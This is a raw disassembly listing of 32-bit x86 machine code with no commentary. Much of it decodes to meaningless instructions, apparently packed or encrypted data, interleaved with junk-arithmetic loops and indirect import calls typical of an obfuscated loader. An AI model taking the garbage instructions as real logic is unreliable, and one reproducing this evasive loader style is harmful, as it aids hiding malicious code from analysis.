  40b86b:	rcl    DWORD PTR [eax+0xd],1
  40b86e:	sub    ecx,esp
  40b870:	dec    ecx
  40b871:	js     0x40b802
  40b873:	or     esp,edx
  40b875:	stos   BYTE PTR es:[edi],al
  40b876:	call   FWORD PTR [eax]
  40b878:	out    0xa2,al
  40b87a:	(bad)  
  40b87c:	cmp    eax,0x78364bbf
  40b881:	int    0x9d
  40b883:	xchg   ebx,eax
  40b884:	mov    bh,0x59
  40b886:	or     al,0xd8
  40b888:	cmp    al,0xd9
  40b88a:	fdivp  st(6),st
  40b88c:	out    0xca,al
  40b88e:	aam    0xb9
  40b890:	add    ecx,DWORD PTR [edi+0x3409d258]
  40b896:	aas    
  40b897:	jp     0x40b88c
  40b899:	xor    BYTE PTR [ebx-0xdc5b7e],al
  40b89f:	add    dh,cl
  40b8a1:	arpl   bx,dx
  40b8a3:	loop   0x40b845
  40b8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a6:	xchg   edx,eax
  40b8a7:	mov    al,ds:0x7181f3e2
  40b8ac:	call   0x8c2c:0x50df8ce7
  40b8b3:	imul   ebx,esi,0xc2a5ad16
  40b8b9:	(bad)  
  40b8ba:	ja     0x40b8b7
  40b8bc:	push   cs
  40b8bd:	and    BYTE PTR [edx],cl
  40b8bf:	mov    dl,0x43
  40b8c1:	ja     0x40b860
  40b8c3:	sbb    al,0x2d
  40b8c5:	sbb    eax,0x4207ce7b
  40b8ca:	pop    ds
  40b8cb:	dec    edi
  40b8cc:	xchg   edi,eax
  40b8cd:	outs   dx,DWORD PTR ds:[esi]
  40b8ce:	mov    ebx,?
  40b8d0:	aad    0x3f
  40b8d2:	(bad)  
  40b8d4:	jmp    0x7de29667
  40b8d9:	out    0x15,eax
  40b8db:	cdq    
  40b8dc:	inc    esi
  40b8dd:	ins    DWORD PTR es:[edi],dx
  40b8de:	leave  
  40b8df:	push   ecx
  40b8e0:	stos   BYTE PTR es:[edi],al
  40b8e1:	std    
  40b8e2:	popa   
  40b8e3:	xor    edi,ebp
  40b8e5:	enter  0xc4bd,0xe
  40b8e9:	inc    ecx
  40b8ea:	(bad)  
  40b8eb:	fistp  WORD PTR ds:0x4a9d84e8
  40b8f1:	fld    TBYTE PTR [esp+ecx*1-0x13]
  40b8f5:	mov    al,ds:0x5c83b46b
  40b8fa:	mov    DWORD PTR [ebp-0x14],esi
  40b8fd:	sbb    ecx,DWORD PTR ds:0x430546
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430496
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43049e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4304a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ee28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ee2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ee20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	sbb    BYTE PTR [edi],0xfd
  40b962:	xchg   edi,eax
  40b963:	jne    0x40b9a3
  40b965:	clc    
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b90b
  40b96d:	push   0xffffffad
  40b96f:	inc    esp
  40b970:	loope  0x40b9c2
  40b972:	pop    edx
  40b973:	inc    esp
  40b974:	add    BYTE PTR [edi],ch
  40b976:	ins    DWORD PTR es:[edi],dx
  40b977:	int3   
  40b978:	pop    esi
  40b979:	lds    eax,FWORD PTR [edx]
  40b97b:	mov    cl,0x76
  40b97d:	pop    ebp
  40b97e:	mov    dl,0x1d
  40b980:	aas    
  40b981:	mov    edi,0xbeb15567
  40b986:	out    dx,eax
  40b987:	mov    al,ds:0x50398ecd
  40b98c:	cli    
  40b98d:	xor    eax,0x907afaca
  40b992:	retf   0xfb1f
  40b995:	bound  ecx,QWORD PTR [edx]
  40b997:	inc    ebp
  40b998:	mov    esi,0x89c84990
  40b99d:	in     eax,dx
  40b99e:	or     eax,0xd8c120b1
  40b9a3:	out    dx,eax
  40b9a4:	popa   
  40b9a5:	fst    QWORD PTR [edx]
  40b9a7:	test   BYTE PTR [eax-0x37cf9ede],dl
  40b9ad:	(bad)  
  40b9af:	repnz xchg esi,eax
  40b9b1:	les    edx,FWORD PTR [ecx]
  40b9b3:	addr16 repnz (bad) 
  40b9b6:	dec    ebx
  40b9b7:	loop   0x40b97d
  40b9b9:	adc    ebp,DWORD PTR [ebp*4-0x5a740197]
  40b9c0:	xchg   DWORD PTR [ecx],eax
  40b9c2:	mov    esp,?
  40b9c4:	xchg   BYTE PTR [eax+0x13207578],bl
  40b9ca:	inc    ebp
  40b9cb:	jge    0x40ba3b
  40b9cd:	out    dx,eax
  40b9ce:	mov    ecx,0xf8082762
  40b9d3:	test   BYTE PTR ds:0x1cc08a2c,cl
  40b9d9:	cmp    ebp,DWORD PTR [esi+0x648e61cd]
  40b9df:	adc    DWORD PTR [ebx+0x21],esp
  40b9e2:	xchg   esi,eax
  40b9e3:	lods   eax,DWORD PTR ds:[esi]
  40b9e4:	repz push ds
  40b9e6:	cmp    bh,BYTE PTR [esi+eax*2]
  40b9e9:	mov    bh,0xab
  40b9eb:	mov    esp,0xd2f6ec01
  40b9f0:	fisttp WORD PTR [esi+0x22]
  40b9f3:	fwait
  40b9f4:	adc    DWORD PTR [ebp+0x4e],esp
  40b9f7:	inc    edx
  40b9f8:	ins    BYTE PTR es:[edi],dx
  40b9f9:	xchg   ebx,eax
  40b9fa:	ja     0x40b9aa
  40b9fc:	and    BYTE PTR [esi],ch
  40b9fe:	out    dx,eax
  40b9ff:	jae    0x40ba77
  40ba01:	aas    
  40ba02:	sbb    DWORD PTR ds:0x54c7f91,0xe26cac9d
  40ba0c:	sbb    BYTE PTR [esi+esi*4-0x68],bl
  40ba10:	cmp    ebp,DWORD PTR [esi-0xb]
  40ba13:	test   DWORD PTR [eax+ebx*1-0x4fa7724d],edx
  40ba1a:	fisubr DWORD PTR [edx]
  40ba1c:	mul    DWORD PTR [eax+ecx*1-0x77]
  40ba20:	cmc    
  40ba21:	ror    DWORD PTR [esp+edx*4-0x73],cl
  40ba25:	push   ebp
  40ba26:	jle    0x40baa2
  40ba28:	fnstcw WORD PTR [ebp+0x692c49f0]
  40ba2e:	mov    BYTE PTR [ebp+eax*2-0x26b3d6f5],al
  40ba35:	out    0xee,eax
  40ba37:	push   ds
  40ba38:	out    dx,al
  40ba39:	dec    ebx
  40ba3a:	push   ebx
  40ba3b:	push   ebx
  40ba3c:	add    al,0xb0
  40ba3e:	loopne 0x40baa9
  40ba40:	fwait
  40ba41:	(bad)  
  40ba42:	mov    ds:0x6c04fc10,eax
  40ba47:	loopne 0x40bab5
  40ba49:	mov    al,ds:0xa2d61e4d
  40ba4e:	cmp    DWORD PTR [edx-0x27],ebp
  40ba51:	xor    eax,0x629c9c7c
  40ba56:	std    
  40ba57:	jg     0x40ba0e
  40ba59:	in     al,0x25
  40ba5b:	push   edx
  40ba5c:	push   ecx
  40ba5d:	xchg   ecx,eax
  40ba5e:	(bad)  
  40ba5f:	int3   
  40ba60:	das    
  40ba61:	sbb    al,0x83
  40ba63:	fldpi  
  40ba65:	add    al,0xbe
  40ba67:	mov    ah,0x92
  40ba69:	or     esi,DWORD PTR [ecx-0x4dcc4149]
  40ba6f:	inc    esi
  40ba70:	dec    edi
  40ba71:	inc    esp
  40ba72:	das    
  40ba73:	push   ebx
  40ba74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba75:	lods   eax,DWORD PTR ds:[esi]
  40ba76:	les    ebx,FWORD PTR [eax]
  40ba78:	mov    eax,ds:0xc2614432
  40ba7d:	sub    BYTE PTR [ebx-0x65],dh
  40ba80:	fwait
  40ba81:	retf   
  40ba82:	jne    0x40bafb
  40ba84:	out    0xd9,al
  40ba86:	mov    eax,0xbda41cea
  40ba8b:	aad    0xbe
  40ba8d:	xchg   edi,eax
  40ba8e:	jne    0x40ba8a
  40ba90:	lock into 
  40ba92:	int3   
  40ba93:	mov    cl,0xa2
  40ba95:	js     0x40bafb
  40ba97:	ret    
  40ba98:	add    ah,BYTE PTR [eax]
  40ba9a:	sub    al,0xba
  40ba9c:	hlt    
  40ba9d:	stos   BYTE PTR es:[edi],al
  40ba9e:	mov    ds:0xc2495d68,eax
  40baa3:	xchg   edi,eax
  40baa4:	push   ebx
  40baa5:	jle    0x40bac9
  40baa7:	fdiv   QWORD PTR [ebx]
  40baa9:	fsubr  DWORD PTR [ecx+ebp*8+0x44]
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42ee20,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430496,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ee28,0x42ee14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ee1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ee1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ee1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ee1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ebd4
  40bb1b:	cmp    DWORD PTR ds:0x42ee1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430556
  40bb2e:	xor    DWORD PTR ds:0x4304b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4304b2,0x43049a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	aad    0x4e
  40bb58:	jp     0x40bb51
  40bb5a:	(bad)  
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bb73
  40bb63:	mov    ah,0xf5
  40bb65:	cli    
  40bb66:	pop    esi
  40bb67:	pop    esp
  40bb68:	sub    esi,DWORD PTR [edx-0x17]
  40bb6b:	dec    esp
  40bb6c:	dec    eax
  40bb6d:	add    DWORD PTR [edi+ebx*2-0x5ac70a6f],ebx
  40bb74:	xor    eax,0xffca987a
  40bb79:	xchg   BYTE PTR [ebx],ch
  40bb7b:	dec    ecx
  40bb7c:	vpminsw ymm7,ymm6,ymm5
  40bb80:	out    dx,eax
  40bb81:	adc    ecx,esp
  40bb83:	mov    esi,0xb667745a
  40bb88:	sub    eax,0x3de8f0b9
  40bb8d:	hlt    
  40bb8e:	add    al,0x36
  40bb90:	call   0x85390c7e
  40bb95:	cmc    
  40bb96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb97:	retf   0x582d
  40bb9a:	das    
  40bb9b:	inc    ebp
  40bb9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb9d:	test   al,0x37
  40bb9f:	lods   eax,DWORD PTR ds:[esi]
  40bba0:	lods   eax,DWORD PTR ds:[esi]
  40bba1:	(bad)  
  40bba2:	jne    0x40bb6c
  40bba4:	int3   
  40bba5:	(bad)  
  40bba6:	icebp  
  40bba7:	es dec ecx
  40bba9:	data16 sti 
  40bbab:	das    
  40bbac:	cwde   
  40bbad:	aaa    
  40bbae:	add    DWORD PTR [edi+0x45],eax
  40bbb1:	jns    0x40bb7b
  40bbb3:	jno    0x40bb9d
  40bbb5:	add    BYTE PTR [eax-0x4e05bdec],cl
  40bbbb:	loop   0x40bb86
  40bbbd:	inc    esp
  40bbbe:	lods   al,BYTE PTR ds:[esi]
  40bbbf:	xor    al,0x3b
  40bbc1:	call   0x5c3dce82
  40bbc6:	in     eax,dx
  40bbc7:	adc    eax,0xe99c37a6
  40bbcc:	add    ebx,ecx
  40bbce:	fcmovbe st,st(2)
  40bbd0:	xchg   edx,eax
  40bbd1:	push   cs
  40bbd2:	sbb    bl,dl
  40bbd4:	(bad)  
  40bbd5:	cwde   
  40bbd6:	mov    esi,gs
  40bbd8:	imul   eax,edi,0x8ff76985
  40bbde:	btc    DWORD PTR [eax],eax
  40bbe1:	je     0x40bb6c
  40bbe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe4:	cwde   
  40bbe5:	jb     0x40bbc5
  40bbe7:	imul   ecx
  40bbe9:	(bad)  
  40bbeb:	cmc    
  40bbec:	sti    
  40bbed:	mov    eax,0x8d896a4d
  40bbf2:	sbb    bl,BYTE PTR [ebx-0x3662a3b]
  40bbf8:	(bad)  
  40bbf9:	fcomp  DWORD PTR [edx]
  40bbfb:	in     eax,0x4b
  40bbfd:	repz fs int 0x6c
  40bc01:	xlat   BYTE PTR ds:[ebx]
  40bc02:	stos   DWORD PTR es:[edi],eax
  40bc03:	out    dx,al
  40bc04:	out    dx,eax
  40bc05:	pop    ecx
  40bc06:	sbb    al,0x42
  40bc08:	xchg   ecx,ebp
  40bc0a:	sbb    DWORD PTR [bx+di-0x6],esi
  40bc0e:	out    0xe8,eax
  40bc10:	sub    al,BYTE PTR [edx]
  40bc12:	add    al,BYTE PTR [eax+0x77]
  40bc15:	jmp    0xb236:0xc3356521
  40bc1c:	cmp    dh,BYTE PTR [ecx]
  40bc1e:	push   edx
  40bc1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc20:	mov    dl,0x6
  40bc22:	pop    esi
  40bc23:	rol    DWORD PTR [ebp+ecx*2-0x6aa36fcf],0x44
  40bc2b:	fbld   TBYTE PTR [ebx+0x1b89df99]
  40bc31:	test   eax,0xb45d9532
  40bc36:	jmp    0xcb8f:0xbf924976
  40bc3d:	sbb    DWORD PTR [esi+ebp*8+0x5c5067e0],eax
  40bc44:	stos   DWORD PTR es:[edi],eax
  40bc45:	out    0x8a,al
  40bc47:	(bad)  [edx+0x17]
  40bc4a:	jmp    0x969c1031
  40bc4f:	stc    
  40bc50:	pop    es
  40bc51:	add    eax,DWORD PTR [ebp-0x79]
  40bc54:	xchg   esp,eax
  40bc55:	pop    esi
  40bc56:	fwait
  40bc57:	mov    ecx,0xed001093
  40bc5c:	lods   al,BYTE PTR ds:[esi]
  40bc5d:	ret    0xc900
  40bc60:	dec    esp
  40bc61:	aas    
  40bc62:	mov    eax,ds:0x535ac295
  40bc67:	xchg   BYTE PTR [edi],dl
  40bc69:	xor    esi,esp
  40bc6b:	pop    ebx
  40bc6c:	test   eax,0x60f9361f
  40bc71:	mov    bl,BYTE PTR [ebx]
  40bc73:	jb     0x40bc72
  40bc75:	cmp    cl,cl
  40bc77:	cmc    
  40bc78:	in     eax,dx
  40bc79:	and    ah,bl
  40bc7b:	jne    0x40bc2e
  40bc7d:	push   ss
  40bc7e:	mov    ah,0x72
  40bc80:	jecxz  0x40bc02
  40bc82:	in     al,dx
  40bc83:	(bad)  
  40bc84:	push   0x43
  40bc86:	push   eax
  40bc87:	and    al,0xf
  40bc89:	mov    DWORD PTR [ecx],edx
  40bc8b:	call   0x8ed57dcb
  40bc90:	dec    esp
  40bc91:	out    dx,eax
  40bc92:	shr    DWORD PTR [edx+0x76caece5],0xaf
  40bc99:	pop    esp
  40bc9a:	retf   
  40bc9b:	addr16 out 0x7b,al
  40bc9e:	xchg   esi,eax
  40bc9f:	or     bl,BYTE PTR [eax+0x6d]
  40bca2:	scas   al,BYTE PTR es:[edi]
  40bca3:	add    eax,ebx
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x430552,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43054e,0x42ee30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4304be,0x430546
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4304c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4304c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4304c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4304c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4304c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4304a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ea2c
  40bd1f:	cmp    DWORD PTR ds:0x4304c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4304c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4304c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e772,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430496
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43055a,0x430552
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ee10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4304b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4304b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4304b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ea30
  40bdad:	mov    ecx,DWORD PTR ds:0x4304b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4304b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43055a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	mov    bh,0xa2
  40bdde:	js     0x40bdba
  40bde0:	mov    al,0xfa
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40be50
  40bde9:	lods   al,BYTE PTR ds:[esi]
  40bdea:	mov    ecx,DWORD PTR [edi+0x34]
  40bded:	xor    bl,BYTE PTR [ebp-0x12]
  40bdf0:	ret    0x3f67
  40bdf3:	cmp    BYTE PTR [ecx-0x6d4742e8],al
  40bdf9:	ss push 0xffffffd8
  40bdfc:	xchg   edi,eax
  40bdfd:	ffree  st(1)
  40bdff:	imul   ebp,ecx,0xdb4d2b41
  40be05:	push   ebp
  40be06:	dec    ecx
  40be07:	cmp    ah,cl
  40be09:	or     bl,BYTE PTR [edi-0x79]
  40be0c:	mov    ds:0xa57d4183,al
  40be11:	and    eax,0xb6fbccd8
  40be16:	test   al,ch
  40be18:	pusha  
  40be19:	mov    ah,0xcd
  40be1b:	mov    bl,0x2a
  40be1d:	test   al,0x4
  40be1f:	xchg   esi,eax
  40be20:	inc    eax
  40be21:	aam    0x9e
  40be23:	mov    dl,0x4
  40be25:	out    dx,al
  40be26:	jg     0x40be7a
  40be28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be2a:	es sahf 
  40be2c:	cdq    
  40be2d:	mov    edx,ebx
  40be2f:	fnstenv [ebp+0x6f]
  40be32:	test   BYTE PTR [edi],ah
  40be34:	loop   0x40be11
  40be36:	sbb    BYTE PTR [edx+0x5b87e7e9],cl
  40be3c:	mov    ch,0x5b
  40be3e:	mov    ds:0xc1b1bd38,eax
  40be43:	push   esi
  40be44:	repnz sub BYTE PTR [ebp-0x42],dl
  40be48:	jae    0x40be4c
  40be4a:	les    eax,FWORD PTR [ebx+0x698c268a]
  40be50:	adc    dh,BYTE PTR [ebp-0x6f]
  40be53:	push   0x2d1b135e
  40be58:	hlt    
  40be59:	ss dec esi
  40be5b:	xchg   edi,eax
  40be5c:	fild   DWORD PTR [eax-0x1f]
  40be5f:	mov    eax,ds:0x7ae14dcd
  40be64:	push   ds
  40be65:	cwde   
  40be66:	lds    edi,FWORD PTR [ecx+0x5a]
  40be69:	dec    ebx
  40be6a:	sub    BYTE PTR [ecx-0x156d683c],al
  40be70:	lahf   
  40be71:	mov    ebp,0x3d4965f2
  40be76:	xchg   ecx,eax
  40be77:	xchg   edi,eax
  40be78:	or     BYTE PTR ds:[eax+0x43d7da9a],bh
  40be7f:	dec    edi
  40be80:	add    DWORD PTR [esi],esp
  40be82:	iret   
  40be83:	call   0xb6c5:0x17a2de2b
  40be8a:	xchg   BYTE PTR [esi+0x58],dl
  40be8d:	push   ebp
  40be8e:	sub    bl,BYTE PTR [ebp-0x68]
  40be91:	sti    
  40be92:	pop    esi
  40be93:	or     DWORD PTR [ebx],ebp
  40be95:	in     al,0xe8
  40be97:	jo     0x40bed6
  40be99:	push   eax
  40be9a:	mov    eax,ds:0xea494bde
  40be9f:	je     0x40be4c
  40bea1:	push   eax
  40bea2:	fcmovnb st,st(4)
  40bea4:	mov    ds:0x2209b4cb,eax
  40bea9:	lock std 
  40beab:	mov    edx,0x8f60d2cb
  40beb0:	mov    al,ds:0xb3d86e85
  40beb5:	xchg   BYTE PTR [edx-0x245e4fc4],ah
  40bebb:	adc    ebx,0xffffffde
  40bebe:	pop    ecx
  40bebf:	outs   dx,BYTE PTR ds:[esi]
  40bec0:	sbb    BYTE PTR [ecx+0x44a0d3b3],0x98
  40bec7:	mov    al,0xdb
  40bec9:	xlat   BYTE PTR ds:[ebx]
  40beca:	(bad)  
  40becb:	and    DWORD PTR [edx+0x6fe27b2b],edx
  40bed1:	sub    DWORD PTR [edi],ebx
  40bed3:	cwde   
  40bed4:	imul   eax,edx,0x316e1b48
  40beda:	ins    DWORD PTR es:[edi],dx
  40bedb:	in     eax,dx
  40bedc:	jmp    0x2611:0xf485c259
  40bee3:	lods   eax,DWORD PTR ds:[esi]
  40bee4:	jnp    0x40befa
  40bee6:	lods   al,BYTE PTR ds:[esi]
  40bee7:	push   eax
  40bee8:	scas   eax,DWORD PTR es:[edi]
  40bee9:	(bad)  
  40beea:	xchg   edi,eax
  40beeb:	pop    esp
  40beec:	and    al,0xd8
  40beee:	cmp    BYTE PTR [ecx-0x78aa9ce5],0xbc
  40bef5:	jno    0x40bebd
  40bef7:	clc    
  40bef8:	push   ebx
  40bef9:	ds push ebp
  40befb:	adc    BYTE PTR cs:[eax],bl
  40befe:	add    bl,al
  40bf00:	add    edi,DWORD PTR [edx+0x28]
  40bf03:	imul   ebp,esp,0xd003e234
  40bf09:	and    dh,ch
  40bf0b:	fldenv [ebp+0x13afa5c9]
  40bf11:	(bad)  
  40bf12:	fild   DWORD PTR [esi-0x7bb0caac]
  40bf18:	jp     0x40bf33
  40bf1a:	jl     0x40beae
  40bf1c:	mov    esi,0xe18c855a
  40bf21:	fwait
  40bf22:	push   0x7
  40bf24:	xchg   edx,eax
  40bf25:	mov    eax,ds:0x8beda664
  40bf2a:	inc    ebp
  40bf2b:	in     al,dx
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf2f:	sbb    DWORD PTR ds:0x4304a6,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	fwait
  40bf4b:	sub    bh,BYTE PTR [eax+0x45]
  40bf4e:	jno    0x40bf4c
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf12
  40bf57:	(bad)  
  40bf58:	(bad)  
  40bf5a:	and    ebp,DWORD PTR [edx+0x4eed292f]
  40bf60:	inc    eax
  40bf61:	pop    esp
  40bf62:	or     DWORD PTR [eax],ebx
  40bf64:	call   0xab619db9
  40bf69:	dec    ecx
  40bf6a:	adc    DWORD PTR [ecx-0xe83808],esp
  40bf70:	loopne 0x40bfdb
  40bf72:	fist   DWORD PTR [edx-0x1df5c91a]
  40bf78:	cmp    edx,DWORD PTR [eax]
  40bf7a:	test   DWORD PTR [edx-0x2c],edi
  40bf7d:	pop    ecx
  40bf7e:	mov    eax,ds:0xb5793024
  40bf83:	pop    esi
  40bf84:	jle    0x40bfa6
  40bf86:	jne    0x40bf19
  40bf88:	xor    edi,DWORD PTR [edi+ecx*1]
  40bf8b:	inc    ebp
  40bf8c:	xor    BYTE PTR [ebp-0x53ee69fa],dh
  40bf92:	stc    
  40bf93:	dec    edi
  40bf94:	push   es
  40bf95:	aad    0x2b
  40bf97:	aam    0xd
  40bf99:	pop    ebx
  40bf9a:	jns    0x40bfd8
  40bf9c:	aaa    
  40bf9d:	(bad)  [edi+0x63c5aed3]
  40bfa3:	out    0x4c,al
  40bfa5:	add    cl,BYTE PTR [eax]
  40bfa7:	test   eax,0xd2c016ee
  40bfac:	hlt    
  40bfad:	popf   
  40bfae:	scas   eax,DWORD PTR es:[edi]
  40bfaf:	xchg   ebx,eax
  40bfb0:	data16 ss mov al,0xca
  40bfb4:	mov    DWORD PTR [esp+ebx*4+0x125c3ec1],esi
  40bfbb:	je     0x40c010
  40bfbd:	stc    
  40bfbe:	pop    edx
  40bfbf:	jb     0x40bf54
  40bfc1:	sbb    al,0x83
  40bfc3:	bound  edi,QWORD PTR [edx]
  40bfc5:	scas   eax,DWORD PTR es:[edi]
  40bfc6:	cmp    eax,0x18a6a4e6
  40bfcb:	sub    BYTE PTR [edi],bh
  40bfcd:	ins    BYTE PTR es:[edi],dx
  40bfce:	mov    edx,0xcd01196c
  40bfd3:	mov    eax,0x7bdcb08
  40bfd8:	out    0x87,al
  40bfda:	mov    ebp,esi
  40bfdc:	mov    ah,0x8c
  40bfde:	ror    DWORD PTR [edi-0x3f],0x1
  40bfe2:	sub    DWORD PTR [ecx+esi*8],ebp
  40bfe5:	push   ebx
  40bfe6:	mov    cl,0xe3
  40bfe8:	stos   BYTE PTR es:[edi],al
  40bfe9:	cmp    ebx,ebp
  40bfeb:	jne    0x40bfdf
  40bfed:	adc    ebx,DWORD PTR [edx]
  40bfef:	add    dh,BYTE PTR [edx]
  40bff1:	and    ebp,edi
  40bff3:	sub    eax,0xd321b4b5
  40bff8:	sete   BYTE PTR [esi-0x10]
  40bffc:	enter  0xdd1f,0xb0
  40c000:	or     ah,BYTE PTR [ecx+0x555d91c8]
  40c006:	mov    edi,0x7c2f26f4
  40c00b:	xchg   ebx,eax
  40c00c:	push   ebx
  40c00d:	std    
  40c00e:	add    BYTE PTR ds:0x54482eac,0x39
  40c015:	retf   
  40c016:	shl    DWORD PTR [ecx+0x18],1
  40c019:	test   ebx,0x3981aebc
  40c01f:	pop    ecx
  40c020:	inc    edi
  40c021:	ins    BYTE PTR es:[edi],dx
  40c022:	mov    ecx,0x2f52ebe9
  40c027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c028:	std    
  40c029:	cwde   
  40c02a:	adc    eax,0x513c8558
  40c02f:	adc    esi,DWORD PTR [edx-0xc]
  40c032:	repz cli 
  40c034:	icebp  
  40c035:	loope  0x40c043
  40c037:	sub    edx,esp
  40c039:	rcr    DWORD PTR [esi+0x74eb913c],0x1
  40c040:	shl    DWORD PTR [eax+eiz*2],cl
  40c043:	scas   al,BYTE PTR es:[edi]
  40c044:	cwde   
  40c045:	adc    edi,ebx
  40c047:	or     al,BYTE PTR [ebx-0xc9fc49b]
  40c04d:	clc    
  40c04e:	es inc esp
  40c050:	sahf   
  40c051:	jbe    0x40c021
  40c053:	(bad)  
  40c054:	(bad)  
  40c055:	mov    dh,0x5b
  40c057:	mov    ecx,0xeb8a3dd1
  40c05c:	pop    ecx
  40c05d:	add    dh,ah
  40c05f:	loop   0x40c0d7
  40c061:	pop    edi
  40c062:	and    eax,0x2db20ab2
  40c067:	outs   dx,DWORD PTR ds:[esi]
  40c068:	aad    0xb4
  40c06a:	scas   al,BYTE PTR es:[edi]
  40c06b:	enter  0xf11e,0xe2
  40c06f:	mov    ebp,0xe43c5adc
  40c074:	dec    ebx
